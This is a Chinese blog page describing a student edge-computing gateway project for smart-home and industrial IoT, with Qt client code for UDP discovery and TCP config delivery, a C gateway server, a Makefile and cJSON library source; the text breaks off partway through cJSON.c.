<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>边缘计算网关 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">边缘计算网关</h1>
			
		</header>
		<div class="content post__content clearfix">
			


        
                <div id="content_views" class="htmledit_views">
                    <h2> 一、项目整体框架图</h2> 
<p><img alt="0e5752bf6a917e83641fde6f1cdddf7f.png" src="https://images2.imgbox.com/8d/c9/ybmudr8r_o.png"></p> 
<h2>二、项目整体描述</h2> 
<p>边缘计算网关项目主要实现了智能家居场景和工业物联网场景下设备的数据采集和控制。<br> 整个项目分为三大层：用户接口层、网关层、设备层。<br> 其中用户层通过QT客户端、WEB界面及阿里云提供数据展示和用户接口。<br> 网关使用虚拟机代替，基于Linux系统开发，起到数据中转作用，向下对接设备，向上对接客户端及云。<br> 设备家居设备使用STM32单片机自主开发，工业设备使用modbus slave软件模拟。</p> 
<p><br> 我在整个项目中开发的模块是<strong>：设备搜索响应模块</strong><br> 设备搜索模块主要完成局域网内网关搜索及配置下发等功能。首先QT客户端会通过UDP广播发送搜索协议，搜索进程检测到协议匹配后，会进行相应的回复。客户端获取回复同时会获知网关设备的IP地址和端口，接下来设备会基于此IP地址和端口建立TCP服务器，QT作为客户端连入建立长连接。TCP连接成功后，即可完成后续的配置文件下发及心跳包等功能。</p> 
<h2>三、各模块功能介绍</h2> 
<p><strong>WEB模块</strong><br> 移植lighttpd作为网关端服务器，实现了网关的内置网页功能。通过浏览器访问网关的IP地址，即可登录到网关内置网页界面，实现了登录、远程设备信息展示和控制等功能。网页发送http请求后，lighttpd会将请求转发给cgi，通过自行开发的cgi程序，进行解析http请求并做出相应的回复。</p> 
<p><br><strong>QT客户端</strong><br> 使用QT开发了桌面客户端，通过MQTT协议实现数据的采集，协议使用JSON格式，解析完成后刷新到界面上。用户操作界面组件，下发协议来控制设备。（后面的这块需要根据实际情况来描述）主界面使用堆栈窗体来布局，通过MQTT协议来实现和网关设备的通信。收到来自设备的JSON数据后，通过QJson类反序列化得到实际数据，然后刷新到相应的界面上。QT客户端主要完成了设备数据的展示、设备命令的控制及历史数据查询等功能。</p> 
<p></p> 
<p><strong>阿里云模块</strong><br> 使用阿里云的SDK完成阿里云物模型的对接，实现了设备数据上传到阿里云平台，通过阿里云的在线调试功能，可远程实现设备的控制。</p> 
<p><br><strong>数据上报模块</strong><br> 数据上报模块实现了数据从设备到QT客户端的中转，首先设备对应的进程会把采集到的数据刷新到共享内存中，上报进程从共享内存中轮询数据点，根据上报策略来进行上报。上报前会把数据点信息转换为JSON格式，通过MQTT上报给QT客户端。客户端下发的JSON指令解析后，根据设备转发给具体的进程，完成设备的控制。同时，上报模块还需要根据用户的设置修改网关的配置参数，如上报模式、mqtt服务器地址等。<br><br><strong>监控模块</strong><br> 移植mjpg-streamer库，实现了摄像头数据的采集以及分发。mjpg-streamer通过UVC接口实现了摄像头的图像帧采集，通过修改mjpg-streamer源码，将采集到的图像帧缓冲区分别通过http协议和UDP协议发送到了网页和QT客户端，在两个客户端上实现了视频流展示。<br><br><br><strong>STM32采集模块</strong><br> stm32采集模块实现了stm32设备的通信对接，向上通过串口协议采集单片机的数据，并刷新到共享内存，以便上报模块进程使用。向下接收来自上报模块的JSON控制指令，解析后，转换为相应的控制指令后通过串口发送给设，实现设备的控制。</p> 
<p><br><strong>modbus采集模块</strong><br> modbus采集模块实现了modbus工业设备的通信对接，向上通过modbusTCP协议采集单片机的数据，并刷新到共享内存，以便上报模块进程使用。向下接收来自上报模块的JSON控制指令，解析后，转换为标准的modbusTCP指令后通过网络发送给设备，实现设备的控制。</p> 
<p><br><strong>单片机设备模块</strong><br> 单片机模拟了智能家居系统的设备场景，分别实现了传感器数据采集上报、设备的远程控制等功能。通过ADC采集XXX传感器，并按照上报协议通过串口发送给网关设备。接收来自网关的控制指令，通过JSON反序列化后，进行相应的设备控制。呼吸灯来表示设备运行状态，按键模拟墙壁开关同步模拟灯光控制。用到技术点：GPIO、串口通信、串口中断、GPIO中断、硬件定时器、ADC采集等。</p> 
<h2 style="background-color:transparent">四、部分代码展示</h2> 
<h4 style="background-color:transparent">1. QT端部分代码展示</h4> 
<p><strong>dialog.h代码：</strong></p> 
<pre><code class="language-cpp">#ifndef DIALOG_H
#define DIALOG_H

#include &lt;QDialog&gt;
#include &lt;QtNetwork&gt;

#include &lt;QMessageBox&gt;
// 连接类
#include &lt;QTcpSocket&gt;
// 文本流类
#include &lt;QTextStream&gt;

namespace Ui {
class Dialog;
}

class Dialog : public QDialog
{
    Q_OBJECT

public:
    explicit Dialog(QWidget *parent = 0);
    ~Dialog();

    QTimer *getTimer() const;
    void setTimer(QTimer *value);

public slots:
    void on_pushButton_clicked();

    void on_pushButton_2_clicked();
    void tcpReadReadSlot();

    void sendHeartbeat();


private:
    Ui::Dialog *ui;
    QUdpSocket *sender;
    QTimer *timer;
    //QTcpSocket *tcpSocket;
   // QTcpSocket *client; // 连接类对象

    void btnConnClickedSlot(); // 连接按钮点击的槽函数
    void btnSendClickedSlot(); // 发送按钮点击的槽函数
    void connectedSlot(); // 连接成功的槽函数
    void disconnectedSlot(); // 连接失败的槽函数
};

#endif // DIALOG_H
</code></pre> 
<p><strong>dialog.cpp代码：</strong></p> 
<pre><code class="hljs">#include "dialog.h"
#include "ui_dialog.h"
#include "string.h"
#include &lt;QtNetwork&gt;
#include &lt;QJsonDocument&gt;
#include &lt;QJsonObject&gt;
#include &lt;QFile&gt;
#include &lt;QDebug&gt;
#include &lt;QCoreApplication&gt;
#include &lt;QTcpSocket&gt;
#include &lt;QTimer&gt;
#include &lt;QByteArray&gt;
#include &lt;QTextStream&gt;
QTcpSocket tcpSocket;
QHostAddress host;
quint16 port;

//QString message="living!";
Dialog::Dialog(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Dialog)
{
    ui-&gt;setupUi(this);
    // 始终位于前台
    setWindowFlags(Qt::WindowStaysOnTopHint);
    sender = new QUdpSocket(this);
    connect(ui-&gt;pushButton,SIGNAL(clicked()),this,SLOT(on_pushButton_clicked()));
    //tcpSocket= new QTcpSocket(this);
    connect(&amp;tcpSocket,SIGNAL(readyRead()),this,SLOT(tcpReadReadSlot()));

    // 创建定时器，每隔1秒发送心跳包
    timer = new QTimer(this);
    connect(timer, &amp;QTimer::timeout, this,&amp;Dialog::sendHeartbeat);
    timer-&gt;start(1000); // 1000毫秒为间隔

}

Dialog::~Dialog()
{
    delete ui;
}

void Dialog::on_pushButton_clicked()
{
    // qDebug() &lt;&lt; %d",__LINE__;
    char buf[256] = {};
    QByteArray datagram = "coffee";
    sender-&gt;writeDatagram(datagram.data(),datagram.size(),
                          QHostAddress("192.168.50.255"),8686);
    sender-&gt;readDatagram(buf,sizeof(buf),&amp;host,&amp;port);
    if(strcmp(buf, "yes") != 0)
    {
        return;
    }


    // 尝试连接到主机
    tcpSocket.connectToHost(host,port);

    if (tcpSocket.waitForConnected(1000)) // 等待连接成功


    {

        // 创建JSON对象
        QJsonObject json;
        json["type"] = 1;

        // 添加其他键值对

        // 创建JSON文档
        QJsonDocument jsonDoc(json);

        // 将JSON文档转换为字节数组
        QByteArray jsonData = jsonDoc.toJson();

        // 发送JSON数据
        tcpSocket.write(jsonData);

        // 等待数据发送完毕
        if (tcpSocket.waitForBytesWritten()) {
            // qDebug() &lt;&lt; "JSON data sent successfully1";
        } else {
            qDebug() &lt;&lt; "Failed to send JSON data";
        }


    }


}

void Dialog::on_pushButton_2_clicked()
{

    // 创建JSON对象
    QJsonObject json;
    json["type"] = 3;

    // 添加其他键值对

    // 创建JSON文档
    QJsonDocument jsonDoc(json);

    // 将JSON文档转换为字节数组
    QByteArray jsonData = jsonDoc.toJson();

    // 发送JSON数据
    tcpSocket.write(jsonData);

    // 等待数据发送完毕
    if (tcpSocket.waitForBytesWritten()) {
        // qDebug() &lt;&lt; "JSON data sent successfully1";
    } else {
        qDebug() &lt;&lt; "Failed to send JSON data";
    }


    // tcpSocket.write(data); // 发送数据
    //tcpSocket.write(jsonData);
    //tcpSocket.waitForBytesWritten(); // 等待数据发送成功

    // tcpSocket.disconnectFromHost(); // 断开连接



}

void Dialog::tcpReadReadSlot()
{
    // /接收服务器端消息
    QTextStream input(&amp;tcpSocket);
    QString text = input.readAll();
    qDebug() &lt;&lt; text;


    //根据接收消息判断有无心跳
    if(text == "living")
    {

      //  QMessageBox::information(this,"提示","持续心跳中");
        // QMessageBox::warning(this,"提示","type 1无内容！");
        return;
    }

    //根据接收消息判断有无点表，无则下发
    if(text=="no")
    {
        QFile file("D:/example1.json");
        // QFile file(filename);
        // QFile file(QCoreApplication::applicationDirPath()+"/example.txt");
        if (!file.open(QIODevice::ReadOnly | QIODevice::Text))
        {
            qDebug() &lt;&lt; "Failed to open file:" &lt;&lt; file.errorString();
            return;
        }
        else
        {

            // 创建一个数据流
            QDataStream dataStream(&amp;tcpSocket);

            // 设置数据流版本，用于跨平台兼容
            dataStream.setVersion(QDataStream::Qt_5_0);

            // 读取文件内容
            QByteArray fileData = file.readAll();

            qDebug()&lt;&lt;"read all = "&lt;&lt;fileData;

            tcpSocket.write(fileData);


            qDebug() &lt;&lt; "File sent successfully";

            // 断开连接
            // tcpSocket.disconnectFromHost();
            //tcpSocket.waitForDisconnected();

        }

    }

    // //根据接收消息判断点表是否下发成功
    if(text == "succeed")
    {

        QMessageBox::information(this,"提示","点表下发成功");
        // QMessageBox::warning(this,"提示","type 1无内容！");
        return;
    }

}

void Dialog::sendHeartbeat()
{
    // 创建JSON对象
    QJsonObject json;
    json["type"] = 3;

    // 添加其他键值对

    // 创建JSON文档
    QJsonDocument jsonDoc(json);

    // 将JSON文档转换为字节数组
    QByteArray jsonData = jsonDoc.toJson();

    // 发送JSON数据
    tcpSocket.write(jsonData);

    // 等待数据发送完毕
    if (tcpSocket.waitForBytesWritten()) {
        // qDebug() &lt;&lt; "JSON data sent successfully1";
    } else {
        qDebug() &lt;&lt; "Failed to send JSON data";
    }

}
</code></pre> 
<p><strong>dialog.ui代码</strong></p> 
<pre><code class="language-cpp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;ui version="4.0"&gt;
 &lt;class&gt;Dialog&lt;/class&gt;
 &lt;widget class="QDialog" name="Dialog"&gt;
  &lt;property name="geometry"&gt;
   &lt;rect&gt;
    &lt;x&gt;0&lt;/x&gt;
    &lt;y&gt;0&lt;/y&gt;
    &lt;width&gt;486&lt;/width&gt;
    &lt;height&gt;325&lt;/height&gt;
   &lt;/rect&gt;
  &lt;/property&gt;
  &lt;property name="windowTitle"&gt;
   &lt;string&gt;Dialog&lt;/string&gt;
  &lt;/property&gt;
  &lt;layout class="QVBoxLayout" name="verticalLayout_2"&gt;
   &lt;item&gt;
    &lt;layout class="QVBoxLayout" name="verticalLayout"&gt;
     &lt;item&gt;
      &lt;widget class="QPushButton" name="pushButton"&gt;
       &lt;property name="text"&gt;
        &lt;string&gt;下发点表&lt;/string&gt;
       &lt;/property&gt;
      &lt;/widget&gt;
     &lt;/item&gt;
     &lt;item&gt;
      &lt;widget class="QPushButton" name="pushButton_2"&gt;
       &lt;property name="text"&gt;
        &lt;string&gt;心跳&lt;/string&gt;
       &lt;/property&gt;
      &lt;/widget&gt;
     &lt;/item&gt;
    &lt;/layout&gt;
   &lt;/item&gt;
  &lt;/layout&gt;
 &lt;/widget&gt;
 &lt;layoutdefault spacing="6" margin="11"/&gt;
 &lt;resources/&gt;
 &lt;connections/&gt;
&lt;/ui&gt;
</code></pre> 
<h4 style="background-color:transparent">2. 网关层部分代码展示：</h4> 
<p><strong>dev.c代码：</strong></p> 
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include "cJSON.h"
#define N 64
void saveToFile(const char *data);
void parseJSON(const char *json);
int main(int argc, char const *argv[])
{
	int broadfd;

	//创建一个socket文件描述符
	broadfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (broadfd &lt; 0)
	{
		perror("sock err");
		return -1;
	}

	//绑定套接字(ip+port)
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8686); //端口号
	addr.sin_addr.s_addr = INADDR_ANY;

	int addrlen = sizeof(addr);

	if (bind(broadfd, (struct sockaddr *)&amp;addr, addrlen) &lt; 0)
	{
		perror("bind err");
		return -1;
	}

	ssize_t len;
	char buf[N] = {0};
	struct sockaddr_in cliaddr, caddr;

	//接收"coffee"搜索包
	bzero(buf, N);
	len = recvfrom(broadfd, buf, N, 0, (struct sockaddr *)&amp;cliaddr, &amp;addrlen);

	//判断是否是本公司产品：收到的数据是否"coffee"
	if (strcmp(buf, "coffee") != 0)
	{
		printf("not my coffeen");
		return -1;
	}

	//回复yes，告诉软件，我收到了搜索协议，并且回复地址
	sendto(broadfd, "yes", 4, 0, (struct sockaddr *)&amp;cliaddr, addrlen);

	//变身为TCP服务器，准备接收软件的升级文件
	int tcpfd = socket(AF_INET, SOCK_STREAM, 0);
	if (tcpfd &lt; 0)
	{
		perror("sock err");
		return -1;
	}

	if (bind(tcpfd, (struct sockaddr *)&amp;addr, addrlen) &lt; 0)
	{
		perror("bind err");
		return -1;
	}

	//监听套接字
	if (listen(tcpfd, 5) &lt; 0)
	{
		perror("listen err");
		return -1;
	}

	//接收客户端的连接
	printf("wait client connectn");
	int clifd;

	socklen_t len1 = sizeof(caddr);
	clifd = accept(tcpfd, (struct sockaddr *)&amp;caddr, &amp;len1);
	if (clifd &lt; 0)
	{
		perror("accept err");
		return -1;
	}

	//	printf("new cononect comingn");
	//	printf("tcpfd:%d clifd:%dn", tcpfd, clifd);
	//	printf("client:ip=%s port=%dn", inet_ntoa(caddr.sin_addr),
	//		   ntohs(caddr.sin_port));

	char buf2[3000] = {0};
	char buf3[] = "no";
	char buf4[7] = "living";
	//size_t recvbyte=1;
	size_t recvbyte;
loop:
	while (1)
	{
		recvbyte = recv(clifd, buf2, sizeof(buf2), 0);
		//printf("recvbyte = %dn", recvbyte);
		if (recvbyte &gt; 0)
		{
		//printf("Received data: %s", buf2);
			cJSON *root = cJSON_Parse(buf2);
			if (cJSON_HasObjectItem(root,"version") )
			{
				char buf5[8] = "succeed";
				//	printf("Failed to parse JSON data.n");
				saveToFile(buf2);
				if (send(clifd, buf5, strlen(buf5), 0) &lt; 0)
				{

					perror("Sending data failed.");
				}
				printf("Succeeded in delivering the point table.n") ;
				goto loop;
				//	return 0;
			}
			cJSON *item = cJSON_GetObjectItem(root, "type");

			int type = item-&gt;valueint;

			//printf("Type: %dn", type);
			if (type == 1)
			{
				if (send(clifd, buf3, strlen(buf3), 0) &lt; 0)
				{

					perror("Sending data failed.");
				}
				goto loop;
				//	printf("%d %s", strlen(buf3), buf3);

				//send(clifd, buf3, sizeof(bud3), 0);
				//saveToFile(buf2);
			}
			else if (type == 3)
			{
				if (send(clifd, buf4, strlen(buf4), 0) &lt; 0)
				{

					perror("Sending data failed.");
				}
				//				printf("%d %sn", strlen(buf4), buf4);

				//send(clifd, buf4, strlen(buf4), 0);
				goto loop;
				//saveToFile(buf2);
			}

		}
	}
}

void saveToFile(const char *data)
{

	FILE *file = fopen("/text.txt", "w+");
	if (file == NULL)
	{
		perror("Failed to open file");
		exit(1);
	}

	fprintf(file, "%s", data);

	fclose(file);
}
</code></pre> 
<p><strong>Makefile代码：</strong></p> 
<pre><code class="language-cpp">#指定生成的文件名
OJB_OUT = dev


#指定每一个c文件对应的.o文件
OBJS = dev.o 


#指定编译器
CC = gcc


#指定需要的库和路径
ULDFLAGS = cJSON.c  -lm


###########################################
#以下的内容不需要修改
###########################################
all:$(OJB_OUT)


$(OJB_OUT):$(OBJS)
	$(CC) -o $@ $^ $(ULDFLAGS)


dep_files := $(foreach f,$(OBJS),.$(f).d)
dep_files := $(wildcard $(dep_files))


ifneq ($(dep_files),)
  include $(dep_files)
endif


$(OBJS):%.o:%.c
	$(CC) -Wp,-MD,.$@.d -c $&lt; -o $@
    
clean:
	rm -rf .*.o.d *.o $(OJB_OUT)</code></pre> 
<p><strong>cJSON.h代码：</strong></p> 
<pre><code class="language-cpp">/*
  Copyright (c) 2009 Dave Gamble
 
  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:
 
  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.
 
  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
*/

#ifndef cJSON__h
#define cJSON__h

#include &lt;stddef.h&gt;

#ifdef __cplusplus
extern "C"
{
#endif

/* cJSON Types: */
#define cJSON_False 0
#define cJSON_True 1
#define cJSON_NULL 2
#define cJSON_Number 3
#define cJSON_String 4
#define cJSON_Array 5
#define cJSON_Object 6
	
#define cJSON_IsReference 256
#define cJSON_StringIsConst 512

/* The cJSON structure: */
typedef struct cJSON {
	struct cJSON *next,*prev;	/* next/prev allow you to walk array/object chains. Alternatively, use GetArraySize/GetArrayItem/GetObjectItem */
	struct cJSON *child;		/* An array or object item will have a child pointer pointing to a chain of the items in the array/object. */

	int type;					/* The type of the item, as above. */

	char *valuestring;			/* The item's string, if type==cJSON_String */
	int valueint;				/* The item's number, if type==cJSON_Number */
	double valuedouble;			/* The item's number, if type==cJSON_Number */

	char *string;				/* The item's name string, if this item is the child of, or is in the list of subitems of an object. */
} cJSON;

typedef struct cJSON_Hooks {
      void *(*malloc_fn)(size_t sz);
      void (*free_fn)(void *ptr);
} cJSON_Hooks;

/* Supply malloc, realloc and free functions to cJSON */
extern void cJSON_InitHooks(cJSON_Hooks* hooks);


/* Supply a block of JSON, and this returns a cJSON object you can interrogate. Call cJSON_Delete when finished. */
extern cJSON *cJSON_Parse(const char *value);
/* Render a cJSON entity to text for transfer/storage. Free the char* when finished. */
extern char  *cJSON_Print(cJSON *item);
/* Render a cJSON entity to text for transfer/storage without any formatting. Free the char* when finished. */
extern char  *cJSON_PrintUnformatted(cJSON *item);
/* Render a cJSON entity to text using a buffered strategy. prebuffer is a guess at the final size. guessing well reduces reallocation. fmt=0 gives unformatted, =1 gives formatted */
extern char *cJSON_PrintBuffered(cJSON *item,int prebuffer,int fmt);
/* Delete a cJSON entity and all subentities. */
extern void   cJSON_Delete(cJSON *c);

/* Returns the number of items in an array (or object). */
extern int	  cJSON_GetArraySize(cJSON *array);
/* Retrieve item number "item" from array "array". Returns NULL if unsuccessful. */
extern cJSON *cJSON_GetArrayItem(cJSON *array,int item);
/* Get item "string" from object. Case insensitive. */
extern cJSON *cJSON_GetObjectItem(cJSON *object,const char *string);
extern int cJSON_HasObjectItem(cJSON *object,const char *string);
/* For analysing failed parses. This returns a pointer to the parse error. You'll probably need to look a few chars back to make sense of it. Defined when cJSON_Parse() returns 0. 0 when cJSON_Parse() succeeds. */
extern const char *cJSON_GetErrorPtr(void);
	
/* These calls create a cJSON item of the appropriate type. */
extern cJSON *cJSON_CreateNull(void);
extern cJSON *cJSON_CreateTrue(void);
extern cJSON *cJSON_CreateFalse(void);
extern cJSON *cJSON_CreateBool(int b);
extern cJSON *cJSON_CreateNumber(double num);
extern cJSON *cJSON_CreateString(const char *string);
extern cJSON *cJSON_CreateArray(void);
extern cJSON *cJSON_CreateObject(void);

/* These utilities create an Array of count items. */
extern cJSON *cJSON_CreateIntArray(const int *numbers,int count);
extern cJSON *cJSON_CreateFloatArray(const float *numbers,int count);
extern cJSON *cJSON_CreateDoubleArray(const double *numbers,int count);
extern cJSON *cJSON_CreateStringArray(const char **strings,int count);

/* Append item to the specified array/object. */
extern void cJSON_AddItemToArray(cJSON *array, cJSON *item);
extern void	cJSON_AddItemToObject(cJSON *object,const char *string,cJSON *item);
extern void	cJSON_AddItemToObjectCS(cJSON *object,const char *string,cJSON *item);	/* Use this when string is definitely const (i.e. a literal, or as good as), and will definitely survive the cJSON object */
/* Append reference to item to the specified array/object. Use this when you want to add an existing cJSON to a new cJSON, but don't want to corrupt your existing cJSON. */
extern void cJSON_AddItemReferenceToArray(cJSON *array, cJSON *item);
extern void	cJSON_AddItemReferenceToObject(cJSON *object,const char *string,cJSON *item);

/* Remove/Detatch items from Arrays/Objects. */
extern cJSON *cJSON_DetachItemFromArray(cJSON *array,int which);
extern void   cJSON_DeleteItemFromArray(cJSON *array,int which);
extern cJSON *cJSON_DetachItemFromObject(cJSON *object,const char *string);
extern void   cJSON_DeleteItemFromObject(cJSON *object,const char *string);
	
/* Update array items. */
extern void cJSON_InsertItemInArray(cJSON *array,int which,cJSON *newitem);	/* Shifts pre-existing items to the right. */
extern void cJSON_ReplaceItemInArray(cJSON *array,int which,cJSON *newitem);
extern void cJSON_ReplaceItemInObject(cJSON *object,const char *string,cJSON *newitem);

/* Duplicate a cJSON item */
extern cJSON *cJSON_Duplicate(cJSON *item,int recurse);
/* Duplicate will create a new, identical cJSON item to the one you pass, in new memory that will
need to be released. With recurse!=0, it will duplicate any children connected to the item.
The item-&gt;next and -&gt;prev pointers are always zero on return from Duplicate. */

/* ParseWithOpts allows you to require (and check) that the JSON is null terminated, and to retrieve the pointer to the final byte parsed. */
extern cJSON *cJSON_ParseWithOpts(const char *value,const char **return_parse_end,int require_null_terminated);

extern void cJSON_Minify(char *json);

/* Macros for creating things quickly. */
#define cJSON_AddNullToObject(object,name)		cJSON_AddItemToObject(object, name, cJSON_CreateNull())
#define cJSON_AddTrueToObject(object,name)		cJSON_AddItemToObject(object, name, cJSON_CreateTrue())
#define cJSON_AddFalseToObject(object,name)		cJSON_AddItemToObject(object, name, cJSON_CreateFalse())
#define cJSON_AddBoolToObject(object,name,b)	cJSON_AddItemToObject(object, name, cJSON_CreateBool(b))
#define cJSON_AddNumberToObject(object,name,n)	cJSON_AddItemToObject(object, name, cJSON_CreateNumber(n))
#define cJSON_AddStringToObject(object,name,s)	cJSON_AddItemToObject(object, name, cJSON_CreateString(s))

/* When assigning an integer value, it needs to be propagated to valuedouble too. */
#define cJSON_SetIntValue(object,val)			((object)?(object)-&gt;valueint=(object)-&gt;valuedouble=(val):(val))
#define cJSON_SetNumberValue(object,val)		((object)?(object)-&gt;valueint=(object)-&gt;valuedouble=(val):(val))

/* Macro for iterating over an array */
#define cJSON_ArrayForEach(pos, head)			for(pos = (head)-&gt;child; pos != NULL; pos = pos-&gt;next)

#ifdef __cplusplus
}
#endif

#endif
</code></pre> 
<p>cJSON.c代码:</p> 
<pre><code class="language-cpp">/*
  Copyright (c) 2009 Dave Gamble

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
*/

/* cJSON */
/* JSON parser in C. */

#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;math.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;float.h&gt;
#include &lt;limits.h&gt;
#include &lt;ctype.h&gt;
#include "cJSON.h"

static const char *ep;

const char *cJSON_GetErrorPtr(void) {return ep;}

static int cJSON_strcasecmp(const char *s1,const char *s2)
{
	if (!s1) return (s1==s2)?0:1;if (!s2) return 1;
	for(; tolower(*s1) == tolower(*s2); ++s1, ++s2)	if(*s1 == 0)	return 0;
	return tolower(*(const unsigned char *)s1) - tolower(*(const unsigned char *)s2);
}

static void *(*cJSON_malloc)(size_t sz) = malloc;
static void (*cJSON_free)(void *ptr) = free;

static char* cJSON_strdup(const char* str)
{
      size_t len;
      char* copy;

      len = strlen(str) + 1;
      if (!(copy = (char*)cJSON_malloc(len))) return 0;
      memcpy(copy,str,len);
      return copy;
}

void cJSON_InitHooks(cJSON_Hooks* hooks)
{
    if (!hooks) { /* Reset hooks */
        cJSON_malloc = malloc;
        cJSON_free = free;
        return;
    }

	cJSON_malloc = (hooks-&gt;malloc_fn)?hooks-&gt;malloc_fn:malloc;
	cJSON_free	 = (hooks-&gt;free_fn)?hooks-&gt;free_fn:free;
}

/* Internal constructor. */
static cJSON *cJSON_New_Item(void)
{
	cJSON* node = (cJSON*)cJSON_malloc(sizeof(cJSON));
	if (node) memset(node,0,sizeof(cJSON));
	return node;
}

/* Delete a cJSON structure. */
void cJSON_Delete(cJSON *c)
{
	cJSON *next;
	while (c)
	{
		next=c-&gt;next;
		if (!(c-&gt;type&amp;cJSON_IsReference) &amp;&amp; c-&gt;child) cJSON_Delete(c-&gt;child);
		if (!(c-&gt;type&amp;cJSON_IsReference) &amp;&amp; c-&gt;valuestring) cJSON_free(c-&gt;valuestring);
		if (!(c-&gt;type&amp;cJSON_StringIsConst) &amp;&amp; c-&gt;string) cJSON_free(c-&gt;string);
		cJSON_free(c);
		c=next;
	}
}

/* Parse the input text to generate a number, and populate the result into item. */
static const char *parse_number(cJSON *item,const char *num)
{
	double n=0,sign=1,scale=0;int subscale=0,signsubscale=1;

	if (*num=='-') sign=-1,num++;	/* Has sign? */
	if (*num=='0') num++;			/* is zero */
	if (*num&gt;='1' &amp;&amp; *num&lt;='9')	do	n=(n*10.0)+(*num++ -'0');	while (*num&gt;='0' &amp;&amp; *num&lt;='9');	/* Number? */
	if (*num=='.' &amp;&amp; num[1]&gt;='0' &amp;&amp; num[1]&lt;='9') {num++;		do	n=(n*10.0)+(*num++ -'0'),scale--; while (*num&gt;='0' &amp;&amp; *num&lt;='9');}	/* Fractional part? */
	if (*num=='e' || *num=='E')		/* Exponent? */
	{	num++;if (*num=='+') num++;	else if (*num=='-') signsubscale=-1,num++;		/* With sign? */
		while (*num&gt;='0' &amp;&amp; *num&lt;='9') subscale=(subscale*10)+(*num++ - '0');	/* Number? */
	}

	n=sign*n*pow(10.0,(scale+subscale*signsubscale));	/* number = +/- number.fraction * 10^+/- exponent */
	
	item-&gt;valuedouble=n;
	item-&gt;valueint=(int)n;
	item-&gt;type=cJSON_Number;
	return num;
}

static int pow2gt (int x)	{	--x;	x|=x&gt;&gt;1;	x|=x&gt;&gt;2;	x|=x&gt;&gt;4;	x|=x&gt;&gt;8;	x|=x&gt;&gt;16;	return x+1;	}

typedef struct {char *buffer; int length; int offset; } printbuffer;

static char* ensure(printbuffer *p,int needed)
{
	char *newbuffer;int newsize;
	if (!p || !p-&gt;buffer) return 0;
	needed+=p-&gt;offset;
	if (needed&lt;=p-&gt;length) return p-&gt;buffer+p-&gt;offset;

	newsize=pow2gt(needed);
	newbuffer=(char*)cJSON_malloc(newsize);
	if (!newbuffer) {cJSON_free(p-&gt;buffer);p-&gt;length=0,p-&gt;buffer=0;return 0;}
	if (newbuffer) memcpy(newbuffer,p-&gt;buffer,p-&gt;length);
	cJSON_free(p-&gt;buffer);
	p-&gt;length=newsize;
	p-&gt;buffer=newbuffer;
	return newbuffer+p-&gt;offset;
}

static int update(printbuffer *p)
{
	char *str;
	if (!p || !p-&gt;buffer) return 0;
	str=p-&gt;buffer+p-&gt;offset;
	return p-&gt;offset+strlen(str);
}

/* Render the number nicely from the given item into a string. */
static char *print_number(cJSON *item,printbuffer *p)
{
	char *str=0;
